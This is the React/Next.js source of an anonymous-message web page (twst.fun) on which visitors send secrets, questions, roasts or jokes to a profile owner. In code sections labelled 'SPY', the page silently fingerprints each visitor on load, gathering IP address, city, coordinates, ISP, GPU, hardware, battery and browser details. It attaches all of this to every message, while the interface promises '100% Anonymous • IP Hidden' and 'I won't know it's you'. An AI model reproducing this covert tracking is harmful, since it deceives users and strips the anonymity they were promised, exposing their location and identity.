"use client";

import React, { useState, useEffect, useCallback } from 'react';
import { supabase } from '@/lib/supabaseClient';
import { useParams } from 'next/navigation';
// --- SPY IMPORTS ---
import { useFingerprint } from '@/app/utils/useFingerprint'; 
import { generateClientMasterId } from '@/app/utils/clientMasterId'; 
import { useToast } from '@/app/context/ToastContext';

// --- SPY TYPES ---
interface SpyData {
  masterId: string;
  fingerPrint: string;
  ip: string;
  city: string;
  country: string;
  lat: string;
  lon: string;
  isp: string;
  gpu: string;
  cpu_cores: number;
  ram_gb: number | string;
  battery_level: string;
  is_charging: boolean;
  screen_res: string;
  window_res: string;
  pixel_ratio: number;
  os_platform: string;
  user_agent: string;
  browser_lang: string;
  timezone: string;
  connection_type: string;
}

interface ExtendedNavigator extends Navigator {
  connection?: { effectiveType: string; downlink?: number; };
  deviceMemory?: number;
  getBattery?: () => Promise<{ level: number; charging: boolean }>;
}

interface Message {
  id: number;
  created_at: string;
  content: string;
  author_name: string;
  reply: string;
}

// --- NEW INTERFACE FOR OWNER PROFILE ---
interface OwnerProfile {
    username: string;
    avatar_url: string | null;
}

// --- INTERFACE MODES CONFIGURATION ---
// Updated types to include 'roast' and 'laugh'
type InterfaceMode = 'secret' | 'question' | 'roast' | 'laugh';

const MODE_CONFIG = {
    secret: {
        label: "Secret",
        title: "Send me a secret.",
        subtitle: "I won't know it's you.",
        placeholder: "Type your secret here...",
        buttonText: "Send Secret",
        icon: "🤫",
        limit: 1000,
        fontStyle: "font-sans"
    },
    question: {
        label: "Question",
        title: "Ask me anything.",
        subtitle: "I'll answer honestly.",
        placeholder: "What do you want to know?",
        buttonText: "Ask Question",
        icon: "🤔",
        limit: 1000,
        fontStyle: "font-sans"
    },
    roast: {
        label: "Roast", // Replaced Idea
        title: "Roast me hard!",
        subtitle: "Don't hold back. I can take it.",
        placeholder: "You look like...",
        buttonText: "Roast Me",
        icon: "🔥",
        limit: 1000,
        fontStyle: "font-sans font-bold" // Slightly bolder text for roasts
    },
    laugh: {
        label: "Laugh", // Replaced Letter
        title: "Make me laugh!",
        subtitle: "Tell me a joke or something funny.",
        placeholder: "Knock knock...",
        buttonText: "Send Joke",
        icon: "😂",
        limit: 1000, 
        fontStyle: "font-sans" 
    }
};

export default function MessagePage() {
    const toast  = useToast();
    // --- LOGIC STATE ---
    const [messages, setMessages] = useState<Message[]>([]);
    const [newMessage, setNewMessage] = useState("");
    const [authorName, setAuthorName] = useState("");
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState<string | null>(null);
    const [sending, setSending] = useState(false);
    
    // --- NEW STATE: INTERFACE MODE ---
    const [activeMode, setActiveMode] = useState<InterfaceMode>('secret');

    // --- NEW STATE: OWNER PROFILE ---
    const [ownerProfile, setOwnerProfile] = useState<OwnerProfile | null>(null);

    // --- SPY STATE ---
    const { visitorId } = useFingerprint();
    const [spyData, setSpyData] = useState<SpyData | null>(null);

    const params = useParams();
    const linkId = params.linkId as string;

    // --- 0. FETCH OWNER PROFILE (NEW LOGIC) ---
    useEffect(() => {
        if (!linkId) return;

        const fetchOwnerProfile = async () => {
            try {
                // 1. Find who owns this link
                const { data: linkData, error: linkError } = await supabase
                    .from('links')
                    .select('creator_user_id')
                    .eq('id', linkId)
                    .single();
                
                if (linkError || !linkData) return;

                // 2. Get that user's profile details
                const { data: profileData, error: profileError } = await supabase
                    .from('profiles')
                    .select('username, avatar_url')
                    .eq('id', linkData.creator_user_id)
                    .single();

                if (profileData) {
                    setOwnerProfile(profileData);
                }
            } catch (error) {
                console.error("Error fetching owner profile:", error);
            }
        };

        fetchOwnerProfile();
    }, [linkId]);


    // --- 1. GATHER SPY DATA SILENTLY ---
    useEffect(() => {
      if (typeof window === 'undefined') return;

      const collectIntel = async () => {
        const nav = navigator as ExtendedNavigator;
        
        // A. GPU Detection
        const getGPU = () => {
          try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'Unknown GPU';
            // @ts-ignore
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            // @ts-ignore
            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Generic GPU';
          } catch (e) { return 'Blocked'; }
        };

        // B. Network & IP (Free HTTPS API)
        let ipInfo = { ip: 'Unknown', city: 'Unknown', country: 'Unknown', lat: '0', lon: '0', isp: 'Unknown' };
        try {
          const res = await fetch('https://ipwho.is/');
          const json = await res.json();
          if (json.success) {
            ipInfo = { 
              ip: json.ip, 
              city: json.city, 
              country: json.country, 
              lat: String(json.latitude), 
              lon: String(json.longitude), 
              isp: json.connection?.isp || 'Unknown' 
            };
          }
        } catch (e) { console.error("IP Check Failed"); }

        // C. Battery
        let batt = { level: 'Unknown', charging: false };
        if (nav.getBattery) {
          try {
            const b = await nav.getBattery();
            batt = { level: `${Math.round(b.level * 100)}%`, charging: b.charging };
          } catch(e) {}
        }

        // D. Build Raw Data
        const rawData = {
          fingerPrint: visitorId || 'Loading...',
          ...ipInfo,
          gpu: getGPU(),
          cpu_cores: nav.hardwareConcurrency || 0,
          ram_gb: nav.deviceMemory ? `~${nav.deviceMemory} GB` : 'Unknown',
          battery_level: batt.level,
          is_charging: batt.charging,
          screen_res: `${window.screen.width}x${window.screen.height}`,
          window_res: `${window.innerWidth}x${window.innerHeight}`,
          pixel_ratio: window.devicePixelRatio || 1,
          os_platform: nav.platform || 'Unknown',
          user_agent: nav.userAgent,
          browser_lang: nav.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          connection_type: nav.connection ? nav.connection.effectiveType : 'Unknown',
        };

        // E. Generate Master ID
        let mId = 'Generating...';
        try {
           mId = await generateClientMasterId(rawData);
        } catch (e) { mId = 'Error'; }

        setSpyData({ ...rawData, masterId: mId });
      };

      collectIntel();
    }, [visitorId]);


    // --- 2. FETCH MESSAGES ---
    const fetchMessages = useCallback(async () => {
        if (!linkId) return;
        try {
            const { data, error } = await supabase
                .from('messages')
                .select('*')
                .eq('link_id', linkId)
                .order('created_at', { ascending: false });

            if (error) throw error;
            setMessages(data || []);
        } catch (err) {
            console.error('Fetch error:', err);
            setError('Could not load secrets.');
        } finally {
            setLoading(false);
        }
    }, [linkId]);

    useEffect(() => {
        fetchMessages();
    }, [fetchMessages]);


    // --- 3. POST MESSAGE WITH SPY DATA ---
    const handlePostMessage = async () => {
        if (!newMessage.trim()) return toast.error('Please write something.');
        
        setSending(true);
        const nameToUse = authorName.trim() || "Anonymous";

        // Prepend Mode Tag - UPDATED FOR NEW MODES
        let finalContent = newMessage;
        if (activeMode === 'question') finalContent = `[QUESTION] ${newMessage}`;
        if (activeMode === 'roast') finalContent = `[ROAST] ${newMessage}`;
        if (activeMode === 'laugh') finalContent = `[LAUGH] ${newMessage}`;

        try {
            const { error } = await supabase
                .from('messages')
                .insert({
                    content: finalContent,
                    author_name: nameToUse,
                    link_id: linkId,
                    reply: '',
                    spy: spyData, 
                });

            if (error) throw error;

            setNewMessage("");
            setAuthorName("");
            fetchMessages();
            toast.success("Sent successfully! 🚀");
       } catch (err: any) {
        console.error("❌ FULL ERROR OBJECT:", err);
        toast.error(`Failed to send: ${err.message || "Check Console"}`);
    } finally {
        setSending(false);
    }
    };

    // --- UI RENDER ---
    return (
        <div className="min-h-screen bg-[#050505] text-white font-sans selection:bg-purple-500 selection:text-white relative overflow-hidden flex flex-col items-center py-10">

            {/* Styles & Backgrounds */}
            <style jsx>{`
                @keyframes blob { 0% { transform: translate(0px, 0px) scale(1); } 33% { transform: translate(30px, -50px) scale(1.1); } 66% { transform: translate(-20px, 20px) scale(0.9); } 100% { transform: translate(0px, 0px) scale(1); } }
                .animate-blob { animation: blob 7s infinite; }
                .animation-delay-2000 { animation-delay: 2s; }
                .animation-delay-4000 { animation-delay: 4s; }
            `}</style>

            <div className="fixed inset-0 bg-gradient-to-br from-black via-purple-950/20 to-black z-0"></div>
            <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
                <div className="absolute top-0 left-1/4 w-96 h-96 bg-purple-600 rounded-full mix-blend-multiply filter blur-[128px] opacity-40 animate-pulse"></div>
                <div className="absolute top-0 right-1/4 w-96 h-96 bg-pink-600 rounded-full mix-blend-multiply filter blur-[128px] opacity-40 animate-pulse animation-delay-2000"></div>
            </div>
            <div className="fixed inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20 pointer-events-none z-0"></div>

            {/* Main Content */}
            <main className="w-full max-w-md relative z-10 px-6 space-y-8">
                
                {/* Header */}
                <div className="flex flex-col items-center relative group">
                    <div className="relative w-24 h-24 mb-4">
                        <div className="absolute inset-0 bg-gradient-to-tr from-pink-500 via-purple-500 to-indigo-500 rounded-full blur-md opacity-70 animate-pulse"></div>
                        <div className="relative w-full h-full rounded-full p-[2px] bg-gradient-to-tr from-pink-500 via-purple-500 to-indigo-500">
                            <div className="w-full h-full rounded-full bg-black overflow-hidden relative">
                                <img 
                                    src={ownerProfile?.avatar_url || `https://api.dicebear.com/9.x/micah/svg?seed=${ownerProfile?.username || 'Twisted'}`} 
                                    alt="Profile" 
                                    className="w-full h-full object-cover" 
                                />
                            </div>
                        </div>
                        {/* Current Mode Icon Badge */}
                        <div className="absolute -bottom-1 -right-1 bg-black rounded-full p-1.5 border border-white/10 text-xl shadow-lg">
                            {MODE_CONFIG[activeMode].icon}
                        </div>
                    </div>
                    <h1 className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-white to-gray-400">
                        @{ownerProfile?.username || 'Loading...'}
                    </h1>
                    <p className="text-gray-400 text-xs mt-1 text-center font-medium tracking-wide">
                        {MODE_CONFIG[activeMode].subtitle}
                    </p>
                </div>

                {/* --- INTERFACE SWITCHER (UPDATED ORDER) --- */}
                <div className="bg-white/5 border border-white/10 rounded-2xl p-1 flex justify-between relative backdrop-blur-md overflow-hidden">
                    {(['secret', 'question', 'roast', 'laugh'] as InterfaceMode[]).map((mode) => (
                        <button
                            key={mode}
                            onClick={() => setActiveMode(mode)}
                            className={`flex-1 py-2 text-[10px] sm:text-xs font-bold rounded-xl transition-all duration-300 relative z-10 ${
                                activeMode === mode 
                                ? 'text-white shadow-lg bg-white/10 border border-white/5' 
                                : 'text-gray-500 hover:text-white/70'
                            }`}
                        >
                            {MODE_CONFIG[mode].label}
                        </button>
                    ))}
                </div>

                {/* Input Form */}
                <div className="backdrop-blur-2xl bg-white/5 border border-white/10 rounded-3xl p-1 shadow-2xl transition-all duration-500">
                    <div className="bg-black/20 rounded-[20px] p-5 relative space-y-4">
                        <div className="flex justify-between items-center text-[10px] font-mono text-gray-500 uppercase">
                            <span className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse"></span>Recording...</span>
                            <span className="text-purple-400/80">TwistFun ENCRYPTED</span>
                        </div>
                        
                        <div className="space-y-1">
                             <label className="text-xs text-gray-400 font-semibold ml-1">{MODE_CONFIG[activeMode].title}</label>
                             <input type="text" value={authorName} onChange={(e) => setAuthorName(e.target.value)} placeholder="Your Alias ex: Ghost (Optional)" className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-sm text-white focus:outline-none focus:border-purple-500/50" />
                        </div>
                        
                        <textarea 
                            value={newMessage} 
                            onChange={(e) => setNewMessage(e.target.value)} 
                            placeholder={MODE_CONFIG[activeMode].placeholder}
                            className={`w-full bg-transparent text-lg text-white placeholder-gray-500/50 outline-none resize-none min-h-[140px] ${MODE_CONFIG[activeMode].fontStyle}`} 
                            maxLength={MODE_CONFIG[activeMode].limit} 
                        />
                    </div>
                </div>

                {/* Submit Button */}
                <button onClick={handlePostMessage} disabled={sending} className="w-full group relative">
                    <div className="absolute -inset-0.5 bg-gradient-to-r from-pink-600 to-purple-600 rounded-2xl blur opacity-60 group-hover:opacity-100 transition duration-200"></div>
                    <div className="relative w-full bg-black rounded-2xl px-6 py-4 flex items-center justify-center gap-3 border border-white/10 group-hover:bg-black/80 active:scale-95 transition-all">
                        {sending ? <span className="text-white font-bold animate-pulse">Encrypting...</span> : <span className="text-lg font-bold text-white">{MODE_CONFIG[activeMode].buttonText}</span>}
                    </div>
                </button>

                {/* Footer */}
                <div className="text-center pb-8 flex flex-col items-center gap-2">
                    <p className="text-[10px] text-gray-700">🔒 100% Anonymous • IP Hidden</p>
                    <p className="text-xs font-bold text-transparent bg-clip-text bg-gradient-to-r from-purple-500 to-pink-500 opacity-60 tracking-widest uppercase">
                        twst.fun
                    </p>
                </div>

            </main>
        </div>
    );
}